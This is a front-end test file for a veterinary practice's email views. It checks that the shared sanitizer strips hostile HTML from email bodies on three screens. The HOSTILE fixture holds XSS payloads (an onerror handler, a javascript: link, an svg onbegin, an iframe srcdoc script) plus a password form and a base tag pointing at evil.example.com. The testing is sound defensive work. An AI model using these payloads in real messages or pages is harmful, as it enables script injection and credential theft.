// PA-08: every screen that shows an email body renders it through the shared email sanitizer
// (utils/sanitizeEmailHtml.ts). Plan: vayd-api docs/test-plans/platform-auth-and-tenancy.md, PA-08-1 and PA-08-2.
import { cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { GmailThreadMessage } from '../api/gmail';

const { state } = vi.hoisted(() => ({ state: { html: '' } }));

const message = (html: string, over: Partial<GmailThreadMessage> = {}): GmailThreadMessage => ({
  id: 'm1',
  threadId: 't1',
  snippet: 'Hello from the client',
  from: { name: 'Ana Rivera', email: 'ana@example.com' },
  to: [{ name: 'Practice', email: 'info@example.com' }],
  subject: 'About Biscuit',
  date: '2026-11-01T15:00:00.000Z',
  isUnread: false,
  isStarred: false,
  labelIds: ['INBOX'],
  hasAttachments: false,
  headers: {
    from: 'Ana Rivera <ana@example.com>',
    to: 'info@example.com',
    cc: '',
    subject: 'About Biscuit',
    messageId: '<m1@example.com>',
    references: '',
    inReplyTo: '',
  },
  body: { html, text: null },
  tracking: null,
  ...over,
});

vi.mock('../api/gmail', async (orig) => ({
  ...(await orig<object>()),
  fetchGmailThread: vi.fn(async () => ({ messages: [message(state.html)] })),
  fetchGmailMailboxes: vi.fn(async () => ({
    mailboxes: [{ email: 'info@example.com', kind: 'shared', connected: true }],
  })),
  fetchGmailMessages: vi.fn(async () => ({
    threads: [
      {
        id: 'm1',
        threadId: 't1',
        snippet: 'Hello from the client',
        from: { name: 'Ana Rivera', email: 'ana@example.com' },
        to: [],
        subject: 'About Biscuit',
        date: '2026-11-01T15:00:00.000Z',
        isUnread: false,
        isStarred: false,
        labelIds: ['INBOX'],
        hasAttachments: false,
      },
    ],
    untaggedQueue: [],
  })),
  fetchGmailSendAsAlias: vi.fn(async () => ({})),
}));
vi.mock('../api/clientsStaff', async (orig) => ({
  ...(await orig<object>()),
  fetchClientByIdStaff: vi.fn(async () => ({ id: 9, email: 'ana@example.com' })),
}));
vi.mock('../hooks/useGmailInboxAccess', () => ({
  useGmailInboxAccess: () => ({ allowed: true, loading: false }),
}));
vi.mock('../api/appointmentRequestSubmissions', async (orig) => ({
  ...(await orig<object>()),
  fetchAppointmentRequestGmailLink: vi.fn(async () => ({
    threadId: 't1',
    mailbox: 'info@example.com',
    subject: 'New appointment request',
    linkedAt: null,
  })),
}));
vi.mock('../utils/appointmentRequestSmsMessage', () => ({
  resolveAppointmentRequestSmsMessage: vi.fn(async () => 'Hi Ana, thanks for your request.'),
}));
vi.mock('./gmail/gmailCompose', async (orig) => ({
  ...(await orig<object>()),
  loadSendAsAliases: vi.fn(async () => []),
}));

import { GmailThreadMessageArticle } from './gmail/GmailThreadMessage';
import { ClientEmailHistoryModal } from './ClientEmailHistoryModal';
import { AppointmentRequestEmailModal } from './AppointmentRequestEmailModal';
import type { AppointmentRequestSubmissionItem } from '../api/appointmentRequestSubmissions';

const HOSTILE = [
  '<p>Please call me about Biscuit.</p>',
  '<img src=x onerror=window.__xss=1>',
  '<a href="javascript:window.__xss=1">click here</a>',
  '<svg><animate onbegin=window.__xss=1 attributeName=x dur=1s></animate></svg>',
  '<iframe srcdoc="<script>window.__xss=1</script>"></iframe>',
  '<form action="https://evil.example.com/steal"><input name="pw"><button>Go</button></form>',
  '<base href="https://evil.example.com/">',
  '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="d">',
].join('');

const NORMAL = [
  '<p>Hi Dr. Smith,</p>',
  '<p>Biscuit is <b>much better</b> today. A few things:</p>',
  '<ul><li>Eating again</li><li>Walking well</li></ul>',
  '<img src="https://example.com/biscuit.jpg" alt="Biscuit">',
  '<p>Details: <a href="https://example.com/notes">notes</a></p>',
  '<div class="gmail_quote"><blockquote class="gmail_quote">On Oct 30 the practice wrote: How is Biscuit?</blockquote></div>',
].join('');

/** The rendered email bodies on the screen (the thread and, for the request modal, the quote too). */
const bodies = () =>
  Array.from(document.body.querySelectorAll<HTMLElement>('.gmail-thread-message__body--html'));

function expectSafe(body: HTMLElement) {
  expect(body.textContent).toContain('Please call me about Biscuit.');
  for (const el of Array.from(body.querySelectorAll('*'))) {
    for (const attr of Array.from(el.attributes)) {
      expect(attr.name.toLowerCase().startsWith('on')).toBe(false);
      expect(attr.value).not.toMatch(/^\s*(javascript|data):/i);
    }
  }
  expect(body.querySelector('iframe, form, input, button, script, base, [srcdoc]')).toBeNull();
  expect(body.querySelector('a[href^="javascript:" i]')).toBeNull();
  expect((window as unknown as { __xss?: unknown }).__xss).toBeUndefined();
}

function expectNormal(body: HTMLElement) {
  expect(body.querySelector('b')?.textContent).toBe('much better');
  expect(Array.from(body.querySelectorAll('li')).map((li) => li.textContent)).toEqual([
    'Eating again',
    'Walking well',
  ]);
  expect(body.querySelector('img')?.getAttribute('src')).toBe('https://example.com/biscuit.jpg');
  const link = body.querySelector('a');
  expect(link?.getAttribute('href')).toBe('https://example.com/notes');
  expect(link?.getAttribute('target')).toBe('_blank');
  expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
  expect(body.querySelector('blockquote')?.textContent).toContain('How is Biscuit?');
}

const screens: Array<{ name: string; count: number; show: () => Promise<void> }> = [
  {
    name: 'GmailThreadMessage',
    count: 1,
    show: async () => {
      render(
        <GmailThreadMessageArticle
          msg={message(state.html)}
          threadId="t1"
          showReplyActions={false}
          actionBusy={false}
          threadLoading={false}
          onCompose={() => {}}
          onOpenAttachment={() => {}}
        />,
      );
    },
  },
  {
    name: 'ClientEmailHistoryModal',
    count: 1,
    show: async () => {
      render(<ClientEmailHistoryModal open clientId={9} clientLabel="Ana Rivera" onClose={() => {}} />);
      const thread = await screen.findByRole('button', { name: /About Biscuit/ });
      fireEvent.click(thread);
    },
  },
  {
    name: 'AppointmentRequestEmailModal (thread and quote)',
    count: 2,
    show: async () => {
      const item = {
        id: 41,
        practiceId: 1,
        submittedAt: '2026-11-01T15:00:00.000Z',
        requestData: { firstName: 'Ana', lastName: 'Rivera', email: 'ana@example.com' },
        created: '2026-11-01T15:00:00.000Z',
        updated: '2026-11-01T15:00:00.000Z',
      } as unknown as AppointmentRequestSubmissionItem;
      render(
        <AppointmentRequestEmailModal
          item={item}
          practiceId={1}
          practiceTz="America/New_York"
          onClose={() => {}}
        />,
      );
    },
  },
];

beforeEach(() => {
  delete (window as unknown as { __xss?: unknown }).__xss;
});
afterEach(cleanup);

describe('PA-08 email HTML is sanitized on every screen', () => {
  for (const s of screens) {
    it(`PA-08-1 hostile email made safe: ${s.name}`, async () => {
      state.html = HOSTILE;
      await s.show();
      await waitFor(() => expect(bodies()).toHaveLength(s.count));
      for (const body of bodies()) expectSafe(body);
      // Give a would-be handler a moment to run.
      await new Promise((r) => setTimeout(r, 20));
      expect((window as unknown as { __xss?: unknown }).__xss).toBeUndefined();
    });

    it(`PA-08-2 normal email still looks right: ${s.name}`, async () => {
      state.html = NORMAL;
      await s.show();
      await waitFor(() => expect(bodies()).toHaveLength(s.count));
      for (const body of bodies()) expectNormal(body);
    });
  }
});
